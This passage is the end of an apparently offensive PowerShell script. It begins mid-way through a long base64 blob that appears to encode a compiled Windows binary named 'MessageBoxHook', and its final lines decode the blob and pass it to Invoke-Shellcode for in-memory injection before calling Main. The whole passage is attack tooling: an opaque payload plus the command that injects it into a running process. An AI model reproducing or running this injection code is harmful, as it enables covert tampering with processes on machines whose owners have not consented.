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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAA0AQAAQKJIomiicKJ4opCimKKgosii0KLYouCi6KLwojCkOKRApEikUKRYpGCkaKRwpHikgKSIpJCkmKSgpKiksKS4pMCkyKTQpNik4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeCl6KXwpfilAKYIphCmGKYgpiimMKY4pkCmSKZQplimYKZopnCmeKaApoimkKaYpqCmqKawprimwKbIptCm2Kbgpuim8Kb4pgCnCKcQpxinIKcopzCnOKdAp0insK7ArtCu2K7gruiu8K74rgCvCK8YryCvKK8wrzivQK9Ir1CvaK94r4CviK+Qr5ivoK+or7CvuK/Ar8iv0K/Yr+Cv6K/wr/ivAMAAANAAAAAAoAigEKAYoCCgKKAwoDiguKbApsim0KYgpyinMKc4p0CnSKdQp1inYKdop3CneKeAp4inkKeYp6CnqKewp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqICoiKiQqJiooKioqLCouKjAqMio0KjYqOCo6KjwqPioAKkIqRCpGKkgqSipMKk4qUCpSKlQqVipYKloqXCpeKmAqYipkKmYqaCpqKmwqbipwKnIqdCp2KkAAADQAACUAQAAqKO4o8ij2KPoo/ijCKQYpCikOKRIpFikaKR4pIikmKSopLikyKTYpOik+KQIpRilKKU4pUilWKVopXiliKWYpailuKXIpdil6KX4pQimGKYopjimSKZYpmimeKaIppimqKa4psim2KbopvimCKcYpyinOKdIp1inaKd4p4inmKeop7inyKfYp+in+KcIqBioKKg4qEioWKhoqHioiKiYqKiouKjIqNio6Kj4qAipGKkoqTipSKlYqWipeKmIqZipqKm4qcip2KnoqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvIq9ir6Kv4qwisGKworDisSKxYrGiseKyIrJisqKy4rMis2KzorPisCK0YrSitOK1IrVitaK14rYitmK2orbityK3Yreit+K0IrhiuKK44rkiuWK5orniuiK6YrqiuuK7Irtiu6K74rgivGK8orzivSK9Yr2iveK+Ir5ivqK+4r8iv2K/or/ivAOAAAIQAAAAIoBigKKA4oEigWKBooHigiKCYoKiguKDIoNig6KD4oAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KEArhCuIK4wrkCuUK5grnCugK6QrqCusK7ArtCu4K7wrgCvEK8grzCvQK9Qr2CvcK+Ar5CvoK+wr8Cv0K/gr/CvAPAAAJABAAAAoBCgIKAwoECgUKBgoHCggKCQoKCgsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQoiCiMKJAolCiYKJwooCikKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpqCmsKbAptCm4KbwpgCnEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrAAgAQAQAAAASKJgomiiAAAAQAEASAAAAHiikKXYpfilGKY4plimiKagpqimsKbopvCmEKgYqCCoKKgwqDioQKhIqFCoWKhoqHCoeKiAqIiokKiYqKCoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATm9uZVww'
[byte[]]$MessageBoxHookShellCode = $Content = [System.Convert]::FromBase64String($MessageBoxHookB64)
Invoke-Shellcode -Shellcode $MessageBoxHookShellCode

Main
